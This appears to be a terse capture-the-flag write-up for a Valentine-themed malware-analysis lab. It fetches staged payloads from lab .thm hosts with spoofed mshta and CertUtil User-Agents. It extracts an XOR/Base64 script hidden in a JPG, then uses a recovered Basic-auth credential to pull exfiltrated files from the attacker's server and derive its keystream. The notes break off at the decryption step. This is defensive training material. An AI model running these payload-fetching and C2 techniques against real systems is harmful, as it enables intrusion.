```Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36```


the .lnk file uses mshta.exe, which relies on the legacy Internet Explorer (Trident) engine.
mshta sends a User-Agent string containing MSIE (Microsoft Internet Explorer) and Trident.

```curl -A "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Trident/7.0)" http://ecard.rosesforyou.thm/love.hta -o love.hta ```

the script executes certutil.exe to download the payload.
certutil is a Windows command-line utility for certificate services, and it has its own distinct User-Agent string. The server is likely checking for this specific string and blocking anything else
Spoof "CertUtil"

```curl -A "Microsoft-CryptoAPI/10.0" http://gifts.bemyvalentine.thm/bthprops.cpl -o bthprops.cpl```


```curl -A "Microsoft-CryptoAPI/10.0" http://loader.sweethearts.thm/cupid.ps1 -o cupid.ps1```


```wget http://cdn.loveletters.thm/roses.jpg```

```wget http://cdn.loveletters.thm/heartbeat.exe```

```cupid.ps1```

It downloads: http://cdn.loveletters.thm/roses.jpg
It searches inside the file for this ASCII marker:
```<!--VALENTINE_PAYLOAD_START-->```

Everything after that marker (up to just before the file ends) is:

XOR-decrypted with key ROSES
interpreted as an ASCII Base64 string
Base64-decoded into a valentine.vbs script

```
strings -a -t d roses.jpg | grep VALENTINE_PAYLOAD_START
     36 <!--VALENTINE_PAYLOAD_START-->
```
     
     
     
```
Base64 of cupid_agent: Y3VwaWRfYWdlbnQ6

request header Authorization: Basic Y3VwaWRfYWdlbnQ6
```
```
Content-Type: application/octet-stream

cupid_agent:R0s3s4r3R3d!V10l3ts4r3Blu3#2024
```

Base64(username:password) is:
```
Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
```
```
Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==
```
```
curl -i -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' \
  http://api.valentinesforever.thm:8080/
```
```  
curl -i -X OPTIONS \
  -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' \
  http://api.valentinesforever.thm:8080/exfil  
```
```
curl -i -H 'Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA==' \
  http://api.valentinesforever.thm:8080/exfil
```
```
AUTH='Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA=='
BASE='http://api.valentinesforever.thm:8080'
```
```
curl -s -H "$AUTH" "$BASE/exfil"  
```
```
for f in \
  065863678632.enc \
  2f7537f1b977_dump.txt.enc \
  61d07abe73c3.enc \
  8d2301ed5797_dump.txt.enc \
  e6ff5528ecc9.enc
do
  curl -s -H "$AUTH" -o "$f" "$BASE/exfil/$f"
done
```

**Step 1:  Generate a known plaintext and get the keystream from the server

**Make a zero file longer than your largest .enc
```
dd if=/dev/zero of=zeros.bin bs=1 count=8192
```
POST it to the server:
```
AUTH='Authorization: Basic Y3VwaWRfYWdlbnQ6UjBzM3M0cjNSM2QhVjEwbDN0czRyM0JsdTMjMjAyNA=='
BASE='http://api.valentinesforever.thm:8080'
```
```
curl -s -H "$AUTH" -H 'Content-Type: application/octet-stream' \
  --data-binary @zeros.bin \
  "$BASE/exfil" -o keystream.bin
```
  
Step 2:  Decrypt the stolen .enc files by XOR with the keystream  
